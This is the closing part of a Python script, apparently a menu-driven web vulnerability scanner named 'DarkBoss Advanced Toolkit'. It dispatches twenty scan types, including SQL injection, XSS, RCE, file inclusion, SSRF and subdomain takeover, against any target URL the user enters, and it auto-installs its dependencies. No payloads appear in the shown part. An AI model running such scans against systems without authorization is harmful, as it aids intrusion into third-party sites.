            print(f"{Colors.RED}[-] Please set target URL first (Option 22){Colors.END}")
            return
        
        print(f"{Colors.CYAN}[*] Starting comprehensive security scan...{Colors.END}")
        
        scans = [
            (1, "SQL Injection", self.sql_injection_scan),
            (2, "IDOR", self.idor_scan),
            (3, "Broken Authentication", self.broken_auth_scan),
            (4, "File Upload", self.file_upload_scan),
            (5, "XSS", self.xss_scan),
            (6, "CSRF", self.csrf_scan),
            (7, "RCE", self.rce_scan),
            (8, "LFI", self.lfi_scan),
            (9, "RFI", self.rfi_scan),
            (10, "Directory Traversal", self.directory_traversal_scan),
            (11, "SSRF", self.ssrf_scan),
            (12, "Security Misconfiguration", self.security_misconfig_scan),
            (14, "Open Redirect", self.open_redirect_scan),
            (15, "Clickjacking", self.clickjacking_scan),
            (16, "Host Header Injection", self.host_header_injection_scan),
            (17, "Sensitive Data Exposure", self.sensitive_data_exposure_scan),
            (18, "Outdated Software", self.outdated_software_scan),
            (19, "Broken Access Control", self.broken_access_control_scan),
            (20, "Business Logic Flaws", self.business_logic_flaws_scan)
        ]
        
        # Subdomain takeover requires domain only
        if self.target_url:
            domain = urlparse(self.target_url).netloc
            scans.append((13, "Subdomain Takeover", lambda x: self.subdomain_takeover_scan(domain)))
        
        for scan_id, scan_name, scan_func in scans:
            print(f"\n{Colors.CYAN}{'='*60}{Colors.END}")
            print(f"{Colors.BOLD}Running {scan_name} Scan...{Colors.END}")
            print(f"{Colors.CYAN}{'='*60}{Colors.END}")
            try:
                if scan_id == 13:  # Subdomain takeover
                    scan_func(domain)
                else:
                    scan_func(self.target_url)
                time.sleep(1)  # Prevent rate limiting
            except Exception as e:
                print(f"{Colors.RED}[-] Error in {scan_name}: {e}{Colors.END}")
        
        self.show_results()
    
    def show_results(self):
        """Show found vulnerabilities"""
        print(f"\n{Colors.CYAN}{'='*60}{Colors.END}")
        print(f"{Colors.BOLD}SCAN RESULTS SUMMARY{Colors.END}")
        print(f"{Colors.CYAN}{'='*60}{Colors.END}")
        
        if self.vulnerabilities_found:
            print(f"{Colors.RED}[!] Found {len(self.vulnerabilities_found)} potential vulnerabilities:{Colors.END}")
            for i, vulnerability in enumerate(self.vulnerabilities_found, 1):
                print(f"{Colors.YELLOW}  {i}. {vulnerability}{Colors.END}")
        else:
            print(f"{Colors.GREEN}[+] No vulnerabilities found!{Colors.END}")
    
    def clear_results(self):
        """Clear scan results"""
        self.vulnerabilities_found = []
        print(f"{Colors.GREEN}[+] Results cleared!{Colors.END}")
    
    def main_loop(self):
        """Main program loop"""
        self.initialize_toolkit()
        
        while True:
            self.display_banner()
            self.display_menu()
            
            try:
                choice = input(f"\n{Colors.BOLD}Enter your choice (1-25): {Colors.END}").strip()
                
                if choice == '25':
                    print(f"{Colors.YELLOW}[*] Thank you for using DarkBoss Toolkit!{Colors.END}")
                    break
                
                elif choice == '21':
                    self.run_all_scans()
                
                elif choice == '22':
                    self.target_url = input(f"{Colors.BOLD}Enter target URL: {Colors.END}").strip()
                    if self.target_url and not self.target_url.startswith(('http://', 'https://')):
                        self.target_url = 'http://' + self.target_url
                    
                    if self.test_connection(self.target_url):
                        print(f"{Colors.GREEN}[+] Target is reachable: {self.target_url}{Colors.END}")
                    else:
                        print(f"{Colors.RED}[-] Target is not reachable{Colors.END}")
                
                elif choice == '23':
                    self.show_results()
                
                elif choice == '24':
                    self.clear_results()
                
                elif choice.isdigit() and 1 <= int(choice) <= 20:
                    if not self.target_url:
                        print(f"{Colors.RED}[-] Please set target URL first (Option 22){Colors.END}")
                        continue
                    
                    scan_functions = {
                        1: self.sql_injection_scan,
                        2: self.idor_scan,
                        3: self.broken_auth_scan,
                        4: self.file_upload_scan,
                        5: self.xss_scan,
                        6: self.csrf_scan,
                        7: self.rce_scan,
                        8: self.lfi_scan,
                        9: self.rfi_scan,
                        10: self.directory_traversal_scan,
                        11: self.ssrf_scan,
                        12: self.security_misconfig_scan,
                        13: lambda: self.subdomain_takeover_scan(urlparse(self.target_url).netloc),
                        14: self.open_redirect_scan,
                        15: self.clickjacking_scan,
                        16: self.host_header_injection_scan,
                        17: self.sensitive_data_exposure_scan,
                        18: self.outdated_software_scan,
                        19: self.broken_access_control_scan,
                        20: self.business_logic_flaws_scan
                    }
                    
                    scan_func = scan_functions.get(int(choice))
                    if scan_func:
                        scan_func(self.target_url) if choice != '13' else scan_func()
                
                else:
                    print(f"{Colors.RED}[-] Invalid choice! Please select 1-25{Colors.END}")
                
                input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
                
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}[*] Toolkit interrupted by user.{Colors.END}")
                break
            except Exception as e:
                print(f"{Colors.RED}[-] Error: {e}{Colors.END}")

def main():
    """Main function"""
    try:
        toolkit = DarkBossAdvancedToolkit()
        toolkit.main_loop()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[*] Toolkit terminated by user.{Colors.END}")
    except Exception as e:
        print(f"{Colors.RED}[-] Fatal error: {e}{Colors.END}")
        sys.exit(1)

if __name__ == "__main__":
    # Check and install required dependencies
    try:
        import requests
        import bs4
        import urllib3
    except ImportError as e:
        print(f"{Colors.RED}[!] Missing dependencies: {e}{Colors.END}")
        print(f"{Colors.YELLOW}[*] Installing required packages...{Colors.END}")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "beautifulsoup4", "urllib3"])
            print(f"{Colors.GREEN}[+] Dependencies installed successfully!{Colors.END}")
            print(f"{Colors.YELLOW}[*] Please run the script again.{Colors.END}")
        except subprocess.CalledProcessError:
            print(f"{Colors.RED}[-] Failed to install dependencies. Please install manually:{Colors.END}")
            print(f"{Colors.YELLOW}    pip install requests beautifulsoup4 urllib3{Colors.END}")
        sys.exit(1)
    
    main()
